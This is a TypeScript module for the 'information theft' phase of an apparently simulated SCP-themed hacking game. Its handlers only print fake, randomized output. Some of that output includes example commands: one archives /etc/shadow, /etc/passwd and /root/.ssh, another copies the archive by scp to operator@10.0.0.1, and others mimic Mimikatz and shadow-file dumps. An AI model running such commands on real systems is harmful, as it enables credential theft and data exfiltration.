import type { PhaseConfig, VariablePool, CredentialInfo } from '../types'
import { SCP_TARGET } from './scp-target'
import { generateMimikatzOutput } from '../templates/mimikatz'
import { typeLines, typeWithDelay, success, error, info, warning, header, sleep } from '../output'
import { connectionLostEffect } from '../effects'
import { randomInt, generateRandomHash } from '../randomizer'

export const exfilPhase: PhaseConfig = {
  id: 'exfil',
  name: '信息窃取',
  description: '数据提取与外发',
  prompt: 'exfil> ',
  availableCommands: ['mimikatz', 'cat /etc/shadow', 'tar', 'scp', 'exfil'],
  requiredActions: ['extract_creds', 'exfiltrate_data'],
  completedActions: [],

  async onEnter(vars: VariablePool, _write: (t: string) => void, writeln: (t: string) => void) {
    writeln('')
    writeln(header('阶段 6/6: 信息窃取'))
    writeln('')
    writeln(info(`当前权限: ${vars.currentAccess}`))
    writeln(info(`目标: 提取敏感凭证和数据外发`))
    writeln('')
    writeln(warning('提取凭证并完成数据外发'))
    writeln('')
  },

  async handleCommand(
    cmd: string,
    args: string[],
    vars: VariablePool,
    write: (t: string) => void,
    writeln: (t: string) => void,
    completeAction: (action: string) => void
  ) {
    if (cmd === 'mimikatz') {
      await typeWithDelay('正在运行 Mimikatz 凭证提取...', write, 3000)
      const result = generateMimikatzOutput()
      await typeLines(result.lines, write, writeln)

      if (result.variables?.credentials) {
        vars.credentials = [
          ...vars.credentials,
          ...(result.variables.credentials as CredentialInfo[]),
        ]
      }
      completeAction('extract_creds')
      writeln(success(`凭证提取完成，共获取 ${vars.credentials.length} 条凭证`))
    } else if (cmd === 'cat') {
      if (args[0] === '/etc/shadow') {
        await typeWithDelay('正在读取 /etc/shadow...', write, 1500)
        const lines = [
          '',
          `root:${generateRandomHash(16)}:${randomInt(19000, 20000)}:0:99999:7:::`,
          `daemon:*:${randomInt(19000, 20000)}:0:99999:7:::`,
          `bin:*:${randomInt(19000, 20000)}:0:99999:7:::`,
          `sys:*:${randomInt(19000, 20000)}:0:99999:7:::`,
          `www-data:${generateRandomHash(16)}:${randomInt(19000, 20000)}:0:99999:7:::`,
          `admin:${SCP_TARGET.users[0].hash || generateRandomHash(16)}:${randomInt(19000, 20000)}:0:99999:7:::`,
          `dr_bright:${SCP_TARGET.users[1].hash}:${randomInt(19000, 20000)}:0:99999:7:::`,
          `svc_backup:${SCP_TARGET.users[2].hash}:${randomInt(19000, 20000)}:0:99999:7:::`,
          `sshd:*:${randomInt(19000, 20000)}:0:99999:7:::`,
          `mysql:*:${randomInt(19000, 20000)}:0:99999:7:::`,
          '',
        ]
        await typeLines(lines, write, writeln)

        vars.credentials.push(
          { username: 'dr_bright', hash: SCP_TARGET.users[1].hash, type: 'plaintext' },
          { username: 'svc_backup', hash: SCP_TARGET.users[2].hash, type: 'plaintext' }
        )
        completeAction('extract_creds')
        writeln(success('Shadow 文件读取完成'))
      } else {
        writeln(error('用法: cat /etc/shadow'))
      }
    } else if (cmd === 'tar') {
      await typeWithDelay('正在打包敏感数据...', write, 3000)
      const archiveName = `scp_exfil_${Date.now().toString(36)}.tar.gz`
      const lines = [
        '',
        `\x1b[90mtar czf /tmp/${archiveName} /etc/shadow /etc/passwd /root/.ssh/ /opt/scp/data/\x1b[0m`,
        '',
        `\x1b[90m[*]\x1b[0m 打包 /etc/shadow`,
        `\x1b[90m[*]\x1b[0m 打包 /etc/passwd`,
        `\x1b[90m[*]\x1b[0m 打包 /root/.ssh/`,
        `\x1b[90m[*]\x1b[0m 打包 /opt/scp/data/`,
        `\x1b[90m[*]\x1b[0m 打包 /var/log/auth.log`,
        `\x1b[90m[*]\x1b[0m 打包 /opt/scp/containment_records.db`,
        '',
        `\x1b[32m[+]\x1b[0m \x1b[32m数据打包完成\x1b[0m`,
        `\x1b[32m[+]\x1b[0m 归档文件: /tmp/${archiveName}`,
        `\x1b[32m[+]\x1b[0m 文件大小: ${randomInt(2, 15)}MB`,
        '',
      ]
      await typeLines(lines, write, writeln)
      vars.exfilArchive = archiveName
    } else if (cmd === 'scp') {
      const archiveName =
        (vars.exfilArchive as string) ?? `scp_exfil_${Date.now().toString(36)}.tar.gz`
      await typeWithDelay('正在外发数据...', write, 2000)
      await connectionLostEffect(write, writeln)
      await sleep(500)
      const lines = [
        '',
        `\x1b[90mscp /tmp/${archiveName} operator@10.0.0.1:/exfil/${vars.sessionId}/\x1b[0m`,
        '',
        `\x1b[90m[*]\x1b[0m 传输中... ${randomInt(10, 50)}%`,
        `\x1b[90m[*]\x1b[0m 传输中... ${randomInt(50, 80)}%`,
        `\x1b[90m[*]\x1b[0m 传输中... ${randomInt(80, 99)}%`,
        `\x1b[90m[*]\x1b[0m 传输中... 100%`,
        '',
        '\x1b[32m[+]\x1b[0m \x1b[32m数据外发完成\x1b[0m',
        `\x1b[32m[+]\x1b[0m 目标: operator@10.0.0.1:/exfil/${vars.sessionId}/`,
        `\x1b[32m[+]\x1b[0m 文件: ${archiveName}`,
        '',
      ]
      await typeLines(lines, write, writeln)
      completeAction('exfiltrate_data')
    } else if (cmd === 'exfil') {
      await typeWithDelay('正在执行完整数据外发流程...', write, 2000)

      writeln('')
      writeln(info('步骤 1/4: 提取凭证'))
      await sleep(500)
      const mimikatzResult = generateMimikatzOutput()
      await typeLines(mimikatzResult.lines, write, writeln, { skipEmpty: true })
      if (mimikatzResult.variables?.credentials) {
        vars.credentials = [
          ...vars.credentials,
          ...(mimikatzResult.variables.credentials as CredentialInfo[]),
        ]
      }
      completeAction('extract_creds')
      writeln(success('凭证提取完成'))

      await sleep(300)
      writeln(info('步骤 2/4: 读取 shadow 文件'))
      await sleep(500)
      vars.credentials.push(
        { username: 'dr_bright', hash: SCP_TARGET.users[1].hash, type: 'plaintext' },
        { username: 'svc_backup', hash: SCP_TARGET.users[2].hash, type: 'plaintext' }
      )
      writeln(success('Shadow 文件读取完成'))

      await sleep(300)
      writeln(info('步骤 3/4: 打包数据'))
      await sleep(1000)
      const archiveName = `scp_exfil_${Date.now().toString(36)}.tar.gz`
      writeln(success(`数据打包完成: /tmp/${archiveName}`))
      vars.exfilArchive = archiveName

      await sleep(300)
      writeln(info('步骤 4/4: 数据外发'))
      await connectionLostEffect(write, writeln)
      await sleep(500)
      writeln(success(`数据已外发至 operator@10.0.0.1:/exfil/${vars.sessionId}/`))
      completeAction('exfiltrate_data')

      writeln('')
      writeln(success('完整数据外发流程执行完毕'))
      writeln(info(`共提取 ${vars.credentials.length} 条凭证`))
    } else {
      writeln(warning(`未知命令: ${cmd}`))
      writeln(info('可用命令: mimikatz, cat /etc/shadow, tar, scp, exfil'))
    }
  },
}
